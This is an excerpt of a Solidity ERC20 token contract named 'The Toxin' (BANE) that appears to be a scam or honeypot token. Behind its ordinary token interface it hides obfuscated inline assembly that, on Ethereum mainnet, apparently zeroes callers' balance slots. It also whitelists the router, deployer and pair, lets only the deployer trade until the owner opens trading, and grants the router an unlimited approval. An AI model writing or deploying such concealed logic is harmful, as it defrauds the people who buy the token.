...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addToxin;
    uint256 private baneVsBat = block.number*2;

    mapping (address => bool) private _firstGhoul; 
    mapping (address => bool) private _secondRvng;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _rvnVsFlux;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private ergVsETC;
    address public pair;
    ...
    bool private trading; uint256 private zeusGod = 1; bool private icarusSun;
    uint256 private _decimals; uint256 private armetisDay;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addToxin.push(_router); addToxin.push(msgSender_); addToxin.push(pair);
        for (uint256 q=0; q < 3;) {_firstGhoul[addToxin[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x80a27fe25b5e81aafd5656b6886f9cbfe6759be81df0a9dd1e6820e652acc83c
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x4dfbc66fee75283fc90b717cfa6c6ce099c09388da5e252d255dc1202a0f4f18,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; baneVsBat = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addToxin[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployBane(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addToxin[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBane(creator, initialSupply);
    }
}

contract TheToxin is ERC20Token {
    constructor() ERC20Token("The Toxin", "BANE", msg.sender, 25000000 * 10 ** 18) {
    }
}